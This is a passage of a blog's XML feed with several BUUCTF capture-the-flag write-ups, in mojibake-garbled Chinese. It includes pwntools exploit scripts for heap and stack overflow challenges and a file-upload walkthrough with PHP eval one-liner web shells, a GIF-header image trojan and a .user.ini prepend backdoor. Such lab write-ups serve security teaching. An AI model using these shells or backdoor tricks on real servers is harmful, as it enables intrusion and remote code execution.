punctuation">,</span>payload<span class="token punctuation">)</span>alloc<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>å®Œæ•´expå¦‚ä¸‹</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment" spellcheck="true">#context.log_level = "debug"</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./babyheap_0ctf_2017'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#io=remote('node3.buuoj.cn',29849)</span><span class="token keyword">def</span> <span class="token function">alloc</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Command: "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Size: "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">fill</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Command: "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Index: "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Size: "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>len<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Content: "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">free</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Command: "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Index: "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dump</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Command: "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'4'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Index: "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Content: \n"</span><span class="token punctuation">)</span>    data<span class="token operator">=</span>io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> dataalloc<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">)</span>alloc<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span>alloc<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span>alloc<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">)</span>payload<span class="token operator">=</span><span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x18</span>payload<span class="token operator">+=</span>p8<span class="token punctuation">(</span><span class="token number">0xe1</span><span class="token punctuation">)</span>fill<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>alloc<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span>leak<span class="token operator">=</span>u64<span class="token punctuation">(</span>dump<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">)</span>libc<span class="token operator">=</span>leak<span class="token number">-0x3c4b78</span>__malloc_hook<span class="token operator">=</span>libc<span class="token operator">+</span><span class="token number">0x3c4b10</span>one_gadget<span class="token operator">=</span>libc<span class="token operator">+</span><span class="token number">0x4526a</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"leak => 0x%x"</span> <span class="token operator">%</span> leak<span class="token punctuation">)</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"libc => 0x%x"</span> <span class="token operator">%</span> libc<span class="token punctuation">)</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"__malloc_hook => 0x%x"</span> <span class="token operator">%</span> __malloc_hook<span class="token punctuation">)</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"one_gadget => 0x%x"</span> <span class="token operator">%</span> one_gadget<span class="token punctuation">)</span>alloc<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>payload<span class="token operator">=</span>p64<span class="token punctuation">(</span>__malloc_hook<span class="token number">-0x23</span><span class="token punctuation">)</span>fill<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>alloc<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span>alloc<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span>payload<span class="token operator">=</span><span class="token string">'b'</span><span class="token operator">*</span><span class="token number">0x13</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>one_gadget<span class="token punctuation">)</span>fill<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>alloc<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p><img src="/LawlietLW.github.io/2020/02/01/babyheap-0ctf-2017/14.jpg" alt=""><br>æˆåŠŸ</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> å † </tag>
            
            <tag> fastbin attack </tag>
            
            <tag> chunk extend </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF pwn1_sctf_2016</title>
      <link href="/LawlietLW.github.io/2020/01/30/buuctf-pwn1-sctf-2016/"/>
      <url>/LawlietLW.github.io/2020/01/30/buuctf-pwn1-sctf-2016/</url>
      
        <content type="html"><![CDATA[<p>checksec<br><img src="/LawlietLW.github.io/2020/01/30/buuctf-pwn1-sctf-2016/1.jpg" alt=""><br>32ä½ç¨‹åºï¼Œå¼€å¯æ ˆä¸å¯æ‰§è¡Œ<br>IDAåˆ†æï¼Œvulnå‡½æ•°å’Œåé—¨å‡½æ•°</p><a id="more"></a><p><img src="/LawlietLW.github.io/2020/01/30/buuctf-pwn1-sctf-2016/2.jpg" alt=""><br><img src="/LawlietLW.github.io/2020/01/30/buuctf-pwn1-sctf-2016/3.jpg" alt=""></p><p>vulnå‡½æ•°çœ‹èµ·æ¥å¾ˆå¤§ä¸€å¨ï¼Œå®é™…ä¸Šéƒ½æ˜¯C++çš„ä¸€äº›ä¸œè¥¿ï¼Œå‡½æ•°çš„çœŸæ­£æ„æ€å…¶å®å°±æ˜¯æŠŠIæ›¿æ¢æˆyou<br>æ‰§è¡Œç¨‹åºè¯•ä¸€è¯•<br><img src="/LawlietLW.github.io/2020/01/30/buuctf-pwn1-sctf-2016/4.jpg" alt=""><br>å¦‚æˆ‘ä»¬æ‰€æƒ³ä¸€æ ·<br>å†çœ‹å‘ç¼“å†²åŒº<br><img src="/LawlietLW.github.io/2020/01/30/buuctf-pwn1-sctf-2016/5.jpg" alt=""><br>getså…è®¸è¾“å…¥32ä¸ªå­—èŠ‚ï¼Œè€Œsçš„ç¼“å†²åŒºå¤šè¾¾3Cä¸ªå­—èŠ‚ï¼Œä¹Ÿå°±æ˜¯ç›¸å¯¹äºebpæœ‰60ä¸ªå­—èŠ‚ï¼Œåˆ™ç›¸å¯¹äºeipæœ‰64ä¸ªå­—èŠ‚ï¼Œæ­£å¸¸è¾“å…¥çš„è¯æ— æ³•é€ æˆç¼“å†²åŒºæº¢å‡º<br>ä½†ç»“åˆç¨‹åºä¼šæŠŠâ€™Iâ€™æ›¿æ¢æˆâ€™youâ€™çš„æ•ˆæœæ¥çœ‹ï¼Œåªè¦æˆ‘ä»¬è¾“å…¥21ä¸ªâ€™Iâ€™ï¼Œç»è¿‡ä¸‰å€å­—èŠ‚æ›¿æ¢åå°±ä¼šå˜æˆ63ä¸ªå­—èŠ‚ï¼Œå†åŠ ä¸Šä¸€ä¸ªå­—èŠ‚å°±èƒ½é€ æˆç¼“å†²åŒºæº¢å‡º<br>æ‰€ä»¥å¯ä»¥å†™å‡ºexpå¦‚ä¸‹</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment" spellcheck="true">#io = process('./pwn1_sctf_2016')</span>io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node3.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">26405</span><span class="token punctuation">)</span>get_flag_addr <span class="token operator">=</span> <span class="token number">0x08048f0d</span>payload <span class="token operator">=</span> <span class="token string">'I'</span><span class="token operator">*</span><span class="token number">20</span>payload <span class="token operator">+=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">4</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>get_flag_addr<span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p><img src="/LawlietLW.github.io/2020/01/30/buuctf-pwn1-sctf-2016/5.jpg" alt=""><br>æˆåŠŸè¯»å–flag</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> æ ˆæº¢å‡º </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF warmup_csaw_2016</title>
      <link href="/LawlietLW.github.io/2020/01/30/buuctf-warmup-csaw-2016/"/>
      <url>/LawlietLW.github.io/2020/01/30/buuctf-warmup-csaw-2016/</url>
      
        <content type="html"><![CDATA[<p>checksec<br><img src="/LawlietLW.github.io/2020/01/30/buuctf-warmup-csaw-2016/1.jpg" alt=""><br>64ä½ç¨‹åºï¼Œæ²¡æœ‰ä¿æŠ¤</p><a id="more"></a><p>æ‹–å…¥IDAæŸ¥çœ‹,F5å¤§æ³•<br><img src="/LawlietLW.github.io/2020/01/30/buuctf-warmup-csaw-2016/2.jpg" alt=""><br>åŒæ ·æœ‰ä¸€ä¸ªåé—¨å‡½æ•°ï¼Œè¿™ä¸ªåé—¨å‡½æ•°ç›´æ¥è¯»å–flag<br><img src="/LawlietLW.github.io/2020/01/30/buuctf-warmup-csaw-2016/3.jpg" alt=""><br>æ‰€ä»¥åšæ³•å’Œripä¸€æ ·<br>ç›´æ¥è´´exp</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment" spellcheck="true">#io = process('./warmup_csaw_2016')</span>io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node3.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">27003</span><span class="token punctuation">)</span>get_flag_addr <span class="token operator">=</span> <span class="token number">0x40060d</span>payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">72</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>get_flag_addr<span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p><img src="/LawlietLW.github.io/2020/01/30/buuctf-warmup-csaw-2016/5.jpg" alt=""><br>æˆåŠŸè¯»å–flag</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> æ ˆæº¢å‡º </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF rip</title>
      <link href="/LawlietLW.github.io/2020/01/23/buuctf-rip/"/>
      <url>/LawlietLW.github.io/2020/01/23/buuctf-rip/</url>
      
        <content type="html"><![CDATA[<p>å…¥é—¨æ ˆæº¢å‡ºé¢˜ç›®ï¼Œé¦–å…ˆchecksecä¸€ä¸‹<br><img src="/LawlietLW.github.io/2020/01/23/buuctf-rip/1.jpg" alt=""><br>64ä½ç¨‹åºï¼Œæ²¡æœ‰ä»»ä½•ä¿æŠ¤</p><a id="more"></a><p>æ‹–å…¥IDAæŸ¥çœ‹,F5å¤§æ³•å¥½<br>é¦–å…ˆæ˜¯mainå‡½æ•°<br><img src="/LawlietLW.github.io/2020/01/23/buuctf-rip/2.jpg" alt=""><br>è¿˜æœ‰ä¸€ä¸ªåé—¨å‡½æ•°fun()<br><img src="/LawlietLW.github.io/2020/01/23/buuctf-rip/3.jpg" alt=""><br>å¾ˆæ˜æ˜¾,mainå‡½æ•°ä¸­çš„getså­˜åœ¨æº¢å‡º,æ¥ä¸‹æ¥æ¥ç¡®å®šæº¢å‡ºå­—èŠ‚æ•°<br><img src="/LawlietLW.github.io/2020/01/23/buuctf-rip/4.jpg" alt=""><br>ç›¸å¯¹äºEIPæœ‰23ä¸ªå­—èŠ‚<br>expå¦‚ä¸‹</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment" spellcheck="true">#io = process('./rip')</span>io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node3.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">27031</span><span class="token punctuation">)</span>fun_addr <span class="token operator">=</span> <span class="token number">0x40118a</span>payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">23</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>fun_addr<span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p><img src="/LawlietLW.github.io/2020/01/23/buuctf-rip/5.jpg" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> æ ˆæº¢å‡º </tag>
            
            <tag> rip </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF CheckIn</title>
      <link href="/LawlietLW.github.io/2019/12/23/buuctf-checkin/"/>
      <url>/LawlietLW.github.io/2019/12/23/buuctf-checkin/</url>
      
        <content type="html"><![CDATA[<p>æ‰“å¼€ç¯å¢ƒï¼Œæ˜¯ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ é¡µé¢<br><img src="/LawlietLW.github.io/2019/12/23/buuctf-checkin/1.jpg" alt=""></p><a id="more"></a><p>å…ˆæŸ¥çœ‹ä¸€ä¸‹æºä»£ç ï¼Œçœ‹çœ‹æœ‰æ²¡æœ‰å®¢æˆ·ç«¯æ ¡éªŒ<br><img src="/LawlietLW.github.io/2019/12/23/buuctf-checkin/7.jpg" alt=""><br>æ˜¾ç„¶æ²¡æœ‰å®¢æˆ·ç«¯æ ¡éªŒ<br>é¦–å…ˆä¸Šä¼ ä¸€ä¸ªå›¾ç‰‡ï¼Œæ£€æŸ¥ä¸Šä¼ åŠŸèƒ½<br><img src="/LawlietLW.github.io/2019/12/23/buuctf-checkin/2.jpg" alt=""><br>å›¾ç‰‡æ­£å¸¸ä¸Šä¼ <br>æ¥ä¸‹æ¥å†ä¸Šä¼ ä¸€ä¸ªphpæ–‡ä»¶</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> @<span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'shell'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter">?></span></code></pre><p><img src="/LawlietLW.github.io/2019/12/23/buuctf-checkin/3.jpg" alt=""><br>æç¤ºéæ³•åç¼€<br>é‚£ä¹ˆåº”è¯¥æ˜¯ä¸èƒ½æ¥å—phpåç¼€çš„æ–‡ä»¶äº†ï¼Œæˆ‘ä»¬æŠŠåç¼€æ”¹æˆjpgè¯•ä¸€ä¸‹<br><img src="/LawlietLW.github.io/2019/12/23/buuctf-checkin/8.jpg" alt=""><br>æˆ‘æŠŠcontent-typeå­—æ®µå’Œåç¼€åéƒ½æ”¹äº†ä¸€ä¸‹<br><img src="/LawlietLW.github.io/2019/12/23/buuctf-checkin/9.jpg" alt=""><br>ä½†ä¾ç„¶æ— æ³•ä¸Šä¼ ï¼Œæç¤ºæ£€æµ‹åˆ°äº†éæ³•å­—ç¬¦<br>é‚£æˆ‘ä»¬å†æŠŠä¸€å¥è¯æ¢ä¸€ç§å†™æ³•</p><pre class=" language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">language</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span>php<span class="token punctuation">'</span></span><span class="token punctuation">></span></span></span> @<span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'pass'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span></code></pre><p>ç»§ç»­ä¸Šä¼ <br>å¾—åˆ°äº†è¿™æ ·çš„åé¦ˆ<br><img src="/LawlietLW.github.io/2019/12/23/buuctf-checkin/10.jpg" alt=""></p><pre class=" language-bash"><code class="language-bash">exif_imagetype<span class="token punctuation">(</span><span class="token punctuation">)</span> è¯»å–ä¸€ä¸ªå›¾åƒçš„ç¬¬ä¸€ä¸ªå­—èŠ‚å¹¶æ£€æŸ¥å…¶ç­¾åã€‚</code></pre><p>è¿™é‡Œæ˜¯æœ‰æ–‡ä»¶å†…å®¹å¤´æ ¡éªŒ<br>ä¸åŒçš„å›¾ç‰‡å½¢å¼çš„æ–‡ä»¶å¤´å¦‚ä¸‹</p><pre class=" language-bash"><code class="language-bash">JPG ï¼šFF D8 FF E0 00 10 4A 46 49 46GIF<span class="token punctuation">(</span>ç›¸å½“äºæ–‡æœ¬çš„GIF89a<span class="token punctuation">)</span>ï¼š47 49 46 38 39 61PNGï¼š 89 50 4E 47</code></pre><p>ç»™æˆ‘ä»¬çš„shellåŠ ä¸ŠGIFæ–‡ä»¶çš„æ–‡ä»¶å¤´ï¼Œç»§ç»­ä¸Šä¼ <br><img src="/LawlietLW.github.io/2019/12/23/buuctf-checkin/11.jpg" alt=""><br>ä¸Šä¼ æˆåŠŸ<br>ä½†ä¸Šä¼ æˆåŠŸäº†è¯¥å¦‚ä½•åˆ©ç”¨å‘¢ï¼Œå›¾ç‰‡é©¬éœ€è¦æœ‰æ–‡ä»¶åŒ…å«æ¼æ´æˆ–è€…è§£ææ¼æ´æ‰èƒ½å¤Ÿåˆ©ç”¨ï¼Œä½†è¿™é“é¢˜å¹¶æ²¡æœ‰ç›¸åº”çš„æ¼æ´<br>æ¥ä¸‹æ¥å°±æ˜¯æˆ‘ä»è¿™é“é¢˜é‡Œé¢å­¦åˆ°çš„æ–°å§¿åŠ¿äº†<br>å…ˆè´´ä¸ŠPç‰›çš„é“¾æ¥<br><a href="https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html" target="_blank" rel="noopener">.user.iniæ–‡ä»¶æ„æˆçš„PHPåé—¨</a></p><p>php.iniæ˜¯phpé»˜è®¤çš„é…ç½®æ–‡ä»¶ï¼Œå…¶ä¸­åŒ…æ‹¬äº†å¾ˆå¤šphpçš„é…ç½®<br><img src="/LawlietLW.github.io/2019/12/23/buuctf-checkin/12.jpg" alt=""><br>è€Œ.user.iniå®é™…ä¸Šå°±æ˜¯ä¸€ä¸ªå¯ä»¥ç”±ç”¨æˆ·â€œè‡ªå®šä¹‰â€çš„php.iniï¼Œæˆ‘ä»¬èƒ½å¤Ÿè‡ªå®šä¹‰çš„è®¾ç½®æ˜¯æ¨¡å¼ä¸ºâ€œPHP_INI_PERDIR ã€ PHP_INI_USERâ€çš„è®¾ç½®<br>è€Œä¸”ï¼Œå’Œphp.iniä¸åŒçš„æ˜¯ï¼Œ.user.iniæ˜¯ä¸€ä¸ªèƒ½è¢«åŠ¨æ€åŠ è½½çš„iniæ–‡ä»¶<br>æ‰€ä»¥ï¼Œæˆ‘ä»¬èƒ½è½»æ˜“åœ°ç”¨.user.iniæ–‡ä»¶æ„é€ å‡ºä¸€ä¸ªPHPåé—¨<br>Phpé…ç½®é¡¹ä¸­æœ‰ä¸¤ä¸ªæ¯”è¾ƒæœ‰æ„æ€çš„é¡¹<br>auto_append_fileã€auto_prepend_file<br>å…¶ä¸­auto_prepend_fileæŒ‡å®šä¸€ä¸ªæ–‡ä»¶ï¼Œè‡ªåŠ¨åŒ…å«åœ¨è¦æ‰§è¡Œçš„æ–‡ä»¶å‰ï¼Œç±»ä¼¼äºåœ¨æ–‡ä»¶å‰è°ƒç”¨äº†require()å‡½æ•°<br>auto_append_fileåˆ™æ˜¯åœ¨æ–‡ä»¶åé¢åŒ…å«<br>ä¹Ÿå°±æ˜¯è¯´ï¼Œ.user.iniæ–‡ä»¶ç›¸å½“äºåˆ›é€ äº†æ–‡ä»¶åŒ…å«çš„æœºä¼š<br>ç”¨æ³•ä¹Ÿç®€å•ï¼Œç›´æ¥å†™å…¥.user.iniæ–‡ä»¶å³å¯</p><p>æ‰€ä»¥ï¼Œæœ¬é¢˜ä¸­ï¼Œæˆ‘ä»¬åªéœ€è¦å…ˆåˆ›å»ºä¸€ä¸ª.user.iniæ–‡ä»¶<br><img src="/LawlietLW.github.io/2019/12/23/buuctf-checkin/13.jpg" alt=""><br>åŒæ ·éœ€è¦åœ¨.user.iniæ–‡ä»¶å‰åŠ å…¥GIFæ–‡ä»¶å¤´<br>å†åˆ›å»ºä¸€ä¸ªå›¾ç‰‡é©¬<br>å¯ä»¥ä½¿ç”¨copyå‘½ä»¤</p><pre class=" language-bash"><code class="language-bash">copy shell.jpg/b+shell.php/a shell.jpg</code></pre><p>ä¹Ÿå¯ä»¥ä½¿ç”¨ä¸€ä¸ªå«edjpgcomçš„å·¥å…·æ¥ç”Ÿæˆå›¾ç‰‡é©¬</p><p>é¦–å…ˆä¸Šä¼ æˆ‘ä»¬çš„.user.iniæ–‡ä»¶<br><img src="/LawlietLW.github.io/2019/12/23/buuctf-checkin/14.jpg" alt=""><br>ç„¶åä¸Šä¼ å›¾ç‰‡é©¬<br><img src="/LawlietLW.github.io/2019/12/23/buuctf-checkin/15.jpg" alt=""><br>è®¿é—®ä¸€ä¸‹ä¸Šä¼ çš„ä½ç½®<br><img src="/LawlietLW.github.io/2019/12/23/buuctf-checkin/16.jpg" alt=""><br>èšå‰‘è¿æ¥<br><img src="/LawlietLW.github.io/2019/12/23/buuctf-checkin/17.jpg" alt=""><br>æˆåŠŸæ‹¿åˆ°flag</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> .user.iniæ–‡ä»¶çš„åˆ©ç”¨ï¼Œæ–‡ä»¶ä¸Šä¼  </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF Easy Calc</title>
      <link href="/LawlietLW.github.io/2019/12/22/buuctf-easy-calc/"/>
      <url>/LawlietLW.github.io/2019/12/22/buuctf-easy-calc/</url>
      
        <content type="html"><![CDATA[<p>æ‰“å¼€ç¯å¢ƒ<br><img src="/LawlietLW.github.io/2019/12/22/buuctf-easy-calc/1.jpg" alt=""></p><a id="more"></a><p>æŸ¥çœ‹æºä»£ç </p><pre class=" language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span>I've <span class="token keyword">set</span> up WAF to ensure security<span class="token punctuation">.</span><span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span>script<span class="token operator">></span>    <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#calc'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        $<span class="token punctuation">.</span><span class="token function">ajax</span><span class="token punctuation">(</span><span class="token punctuation">{</span>            url<span class="token punctuation">:</span><span class="token string">"calc.php?num="</span><span class="token operator">+</span><span class="token function">encodeURIComponent</span><span class="token punctuation">(</span><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#content"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">val</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            type<span class="token punctuation">:</span><span class="token string">'GET'</span><span class="token punctuation">,</span>            success<span class="token punctuation">:</span><span class="token keyword">function</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#result"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">html</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string">`&lt;div class="alert alert-success">            &lt;strong>ç­”æ¡ˆ:&lt;/strong></span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>data<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">            &lt;/div>`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span><span class="token punctuation">,</span>            error<span class="token punctuation">:</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"è¿™å•¥?ç®—ä¸æ¥!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token 